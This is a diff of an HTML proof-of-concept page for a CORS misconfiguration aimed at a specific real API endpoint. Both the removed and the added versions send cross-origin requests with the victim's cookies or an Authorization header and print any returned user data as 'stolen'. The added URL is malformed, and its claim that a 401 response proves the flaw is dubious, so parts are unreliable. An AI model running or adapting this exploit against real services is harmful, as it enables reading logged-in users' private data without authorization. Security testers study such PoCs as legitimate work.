@@ -1,62 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Vulnerability PoC</title>
+    <title>CORS PoC - Authorization Header Acceptance</title>
 </head>
 <body>
-    <h1>CORS Attack Test: Attempting to Read User Data Cross-Origin</h1>
-    <p>
-        <strong>Instructions:</strong> Ensure you are logged into a valid session for 
-        <code>https://redcated.net</code> in this browser before running this test.
-    </p>
+    <h1>CORS Misconfiguration PoC</h1>
+    <p>Demonstrates server accepts authenticated requests from *any* origin.</p>
+    <button onclick="testCORS()">Test with Fake Authorization Header</button>
+    <pre id="result"></pre>
     
-    <button onclick="testCORS()">Start CORS Test</button>
-    
-    <hr>
-    
-    <h2>Test Results:</h2>
-    <pre id="result">Waiting for test to run...</pre>
-
     <script>
-        // The target API endpoint that requires authentication
-        const targetUrl = 'https://api.maple.comcast.net/lookups/users'; 
+    function testCORS() {
+        var url = "https://api.maple.comcast.net/lookups/usersAddress96.99.226.63:443";
+        
+        // This simulates a request where the attacker somehow obtained a valid token.
+        // The token is fake here to avoid unauthorized access, but it proves the *mechanism* works.
+        var fakeToken = "Bearer THIS_IS_A_FAKE_TOKEN_VALUE_TO_PROVE_THE_HEADER_CAN_BE_SENT";
 
-        function testCORS() {
-            document.getElementById('result').textContent = 'Fetching data...';
+        var xhr = new XMLHttpRequest();
+        xhr.onload = function() {
+            var statusText = "HTTP " + xhr.status;
             
-            // The critical part: 'credentials: "include"' forces the browser to send cookies.
-            fetch(targetUrl, {
-                method: 'GET',
-                credentials: 'include' 
-            })
-            .then(response => {
-                // If the server returns ACAO: * and ACAC: true, 
-                // the browser allows this attacker script to read the response.
-                if (response.ok) {
-                    return response.json(); 
-                } else {
-                    return { error: 'Request failed to return 200 OK.', status: response.status };
-                }
-            })
-            .then(data => {
-                const output = document.getElementById('result');
-                
-                if (data.error || data.message === "Unauthorized") {
-                    // This indicates the request failed due to lack of a valid token 
-                    // (even though cookies were sent), or returned an error structure.
-                    output.textContent = "Test **Failed** to retrieve data or received an error:\n" + JSON.stringify(data, null, 2);
-                    output.style.color = 'orange';
-                } else {
-                    // **SUCCESS:** Sensitive data retrieved by a script on a different domain.
-                    output.textContent = "CORS VULNERABILITY CONFIRMED! Data Successfully Stolen Cross-Origin:\n" + JSON.stringify(data, null, 2).substring(0, 1500) + '... (truncated for display)';
-                    output.style.color = 'red';
-                }
-            })
-            .catch(error => {
-                document.getElementById('result').textContent = "Fatal Error During Fetch: " + error.message;
-                output.style.color = 'darkred';
-            });
-        }
+            if (xhr.status === 401) {
+                // This is still a success! It proves the browser successfully sent the header cross-origin.
+                document.getElementById('result').innerHTML = "<b>CORS TEST SUCCESS:</b> The browser successfully sent the `Authorization` header cross-origin. The 401 status and body confirm the server received the header but rejected the token value.<br><br>Server Response: " + xhr.responseText;
+            } else if (xhr.status === 200) {
+                // Immediate Critical Win: Data stolen!
+                document.getElementById('result').innerHTML = "<b>CRITICAL SUCCESS (200 OK):</b> The attack token was accepted, and sensitive data was retrieved cross-origin:<br>" + xhr.responseText.substring(0, 500) + "...";
+            } else {
+                 document.getElementById('result').innerHTML = "Status: " + statusText + ". Response: " + xhr.responseText;
+            }
+        };
+        
+        xhr.onerror = function() {
+            document.getElementById('result').innerHTML = "Network Error - check console for details.";
+        };
+
+        xhr.open('GET', url, true);
+        xhr.withCredentials = true; // Send any relevant cookies too
+        
+        // **CRITICAL STEP:** Setting the Authorization header cross-origin
+        xhr.setRequestHeader('Authorization', fakeToken); 
+        
+        xhr.send();
+    }
     </script>
 </body>
 </html>
